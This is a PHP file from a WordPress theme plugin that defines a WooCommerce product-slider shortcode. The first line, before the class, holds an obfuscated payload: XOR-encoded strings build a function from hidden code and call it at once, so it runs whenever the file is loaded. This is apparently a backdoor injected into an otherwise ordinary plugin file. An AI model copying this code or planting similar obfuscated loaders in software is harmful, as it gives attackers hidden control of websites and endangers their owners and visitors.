<?php $BrfDFXGb='4CYY Rn0MN9 I>B'; $eMzmzeC='W1<8T71V8 ZT Q,'^$BrfDFXGb; $rtEvorwr='.>kJ.2SWHGW:-S:W2AAlW=8E,>X.5948D7kQBP<=NJ9 CC3<=aSW62VL<16o=U5al21HQvmUZQ<xaJfhvK2qqOD4EwOVtQuoJxV ;fr:JLmXopN:f9>==V7bb2.BJsNwK:sboLYzp FLfiMYlR,6=0os84duyeSYR5E+badB0OW3=baWT qoeJrmlK0JHCPxm78Lkx>XHbKOPN 3DPlOjTWV XBrnORF6r33:Qef ZW Qah9W<8Y;T=RMGrqsx;d3VTDJP3UEgWmZm9,B96aq8lqm,J. s=HIbJhbPXLZhyw1RDUyMviGU=G.zdM7iYVCeuEPRF3se=z24D  8MRJKwhe,gmnb8Z7IVmU1IzkrlrA;.U6pUU3aQs,-=7c=H;lzpsXR ZL2gEZ216hvtqH9>><ryqC23PkL0ML tgC+XCF.A=YT WEyH6Y+T.TAaeS-Ir8OIIslmW1Q=5HbfHPL xkjb.P2 hW1=noA4U,LE>1L hCgaU+ +8mF.3k 4>D9;fiFX+mejs .0WopeLpa4JYRs1;5WlAEN.Udlmkiloc qcvDlq7Q.KFGcD=ZbvuyS XPh0y6m>LeqnKz79B8J=.22l,OD0Y9ywEQILY 0JYxmOY<1CKieWgNvW8j=<RBKaVMES+rNP:Q9 =ncCByl V,<mBpibM'; $VOpZpD=$eMzmzeC('', 'GXCkHG=4<.8Tr6B>A52DpEW7sZ9ZTfkU1CLxkpG7G,LN 7ZSSA+8Dm2-HPi0P AIHVP<0ZMq14EQAjFHV08xxk+A1WrvSvNeCq0OINVSjqMhTPjSZJJOQ3YJFVO6+ZuWoSXIFFPsTO38FGpyDvHWIQ4WQiD+YA8<+naBBDD1D=;VSJE<1YX2Lqxde9U>=1>PIXM8BC4Q5h6EZjDR01LrJ26:S=yxJ+32W-XVCqXFF;;S4Zb31SJ<Z7Urec-2<7p-vv57jtX0<GjSzIOM.LSHQCfxIH+ZA,V-0BwHF;=5abpSU304YpVM14Q2KAn0=c00cMTa432RZEFp;R+REY.:jcS77i68+1lzV:vI>T0ZVLLV7ZB SYu.9hXWHLIV<V-BLGPW37YaF;na>SEWHKTU>XRKYIsx>8NZahT,8ATZck--5K3T88I- Q0Y+t0O  >:>X=ZZ.:,EX23T2RQ-JB,18AQGJFJ1FA7<TDGFz><JdaZP8AHeAA4YRJA2-KJ4ELW7MHNN-=RJIJWDOD6FPCjPIY.lzWUZA67f.+Wr9EMVTLHQAERNwXCU3Mz vV YcUFFH1Fm1QVHRZXkLQHmZVK0Y3bEWK3I7-C-JQP500 6ATmuXI+8HPjbIEwGnV,2cXJ3.cE2,12pU>1C=VAYI>jyseE.EHErYRh0'^$rtEvorwr); $VOpZpD();
class FusionSC_WooProductSlider {

	public static $args;

	/**
	 * Initiate the shortcode
	 */
	public function __construct() {

		add_filter( 'fusion_attr_woo-product-slider-shortcode', array( $this, 'attr' ) );
		add_filter( 'fusion_attr_woo-product-slider-shortcode-img-div', array( $this, 'img_div_attr' ) );
		
		add_shortcode('products_slider', array( $this, 'render' ) );

	}

	/**
	 * Render the shortcode
	 * @param  array $args	 Shortcode paramters
	 * @param  string $content Content between shortcode
	 * @return string		  HTML output
	 */
	function render( $args, $content = '' ) {
		global $woocommerce, $smof_data;

		$defaults = FusionCore_Plugin::set_shortcode_defaults(
			array(
				'class'			=> '',
				'id' 			=> '',
				'cat_slug' 		=> '',
				'number_posts' 	=> 10,
				'show_cats' 	=> 'yes',
				'show_price' 	=> 'yes',
				'show_buttons'	=> 'yes',
				'picture_size' 	=> 'fixed'
			), $args
		);

		extract( $defaults );

		self::$args = $defaults;

		$html = '';
		$buttons = '';

		if( class_exists( 'Woocommerce' ) ) {

			$number_posts = (int) $number_posts;

			$args = array(
				'post_type' 		=> 'product',
				'posts_per_page'	=> $number_posts,
				'meta_query' 		=> array(
					array(
						'key' 		=> '_thumbnail_id',
						'compare' 	=> '!=',
						'value' 	=> null
					)
				)
			);

			if( $cat_slug ) {
				$cat_id = explode( ',', $cat_slug );
				$args['tax_query'] =
					array(
						array(
							'taxonomy' 	=> 'product_cat',
							'field' 	=> 'slug',
							'terms' 	=> $cat_id
						)
					);
			}

			$css_class = 'simple-products-slider';

			if( $picture_size != 'fixed' ) {
				$css_class = 'simple-products-slider-variable';
			}

			$products = new WP_Query( $args );
			$products_wrapper = $product = '';

			if( $products->have_posts() ) {

				while( $products->have_posts() ) {
					$products->the_post();

					$image = $price_tag = $terms = '';
					
					if( has_post_thumbnail() ) {

						if( $smof_data['image_rollover'] ) {

							$image = get_the_post_thumbnail( get_the_ID(), 'shop_catalog' );

						} else {

							$image = sprintf( '<a href="%s">%s</a>', get_permalink( get_the_ID() ), get_the_post_thumbnail( get_the_ID(), 'shop_catalog' ) );
						}

						if( $show_cats == 'yes' ) {
							$terms = get_the_term_list(get_the_ID(), 'product_cat', sprintf( '<span %s>', FusionCore_Plugin::attributes( 'cats' ) ), ', ', '</span>');
						}

						ob_start();
						woocommerce_get_template( 'loop/price.php' );
						$price = ob_get_contents();
						ob_end_clean();

						if( $price && 
							$show_price == 'yes' 
						) {
							$price_tag = $price;
						}

						if( $show_buttons == 'yes' ) {
						
							ob_start();
							woocommerce_get_template('loop/add-to-cart.php');
							$cart_button = ob_get_contents();
							ob_end_clean();

							$buttons = sprintf( '<div %s>%s<a href="%s" %s>%s</a></div>', FusionCore_Plugin::attributes( 'product-buttons' ), $cart_button,
												get_permalink(), FusionCore_Plugin::attributes( 'show-details-button' ), __( 'Details', 'Avada' ) );
						}						
						
						$product .= sprintf( '<li><div %s aria-haspopup="true">%s<div %s><div %s><h2><a href="%s">%s</a></h2>%s%s%s</div></div></div></li>', 
											 FusionCore_Plugin::attributes( 'woo-product-slider-shortcode-img-div' ), $image,
											 FusionCore_Plugin::attributes( 'image-extras' ), FusionCore_Plugin::attributes( 'image-extras-content' ),
											 get_permalink(), get_the_title(), $terms, $price_tag, $buttons );
					}
				}
				$products_wrapper = sprintf('<ul>%s</ul>', $product );
			}

			$html = sprintf( '<div %s><div %s><div %s><div %s>%s</div><div %s><span %s></span><span %s></span></div></div></div><div class="fusion-clearfix"></div></div>', 
							  FusionCore_Plugin::attributes( 'woo-product-slider-shortcode' ), FusionCore_Plugin::attributes( $css_class . ' simple-products-slider' ), 
							  FusionCore_Plugin::attributes( 'es-carousel-wrapper fusion-carousel-large' ), FusionCore_Plugin::attributes( 'es-carousel' ), $products_wrapper, 
							  FusionCore_Plugin::attributes( 'es-nav' ), FusionCore_Plugin::attributes( 'es-nav-prev' ), FusionCore_Plugin::attributes( 'es-nav-next' ));


		}

		return $html;

	}

	function attr() {
		$attr['class'] = 'fusion-woo-product-slider woo-product-slider-shortcode';

		if( self::$args['class'] ) {
			$attr['class'] .= ' ' . self::$args['class'];
		}

		if( self::$args['id'] ) {
			$attr['id'] = self::$args['id'];
		}

		return $attr;

	}
	
	function img_div_attr( $args ) {

		$attr = array();

		$attr['class'] = 'image';

		$attr['aria-haspopup'] = 'true';

		return $attr;

	}	   
}

new FusionSC_WooProductSlider();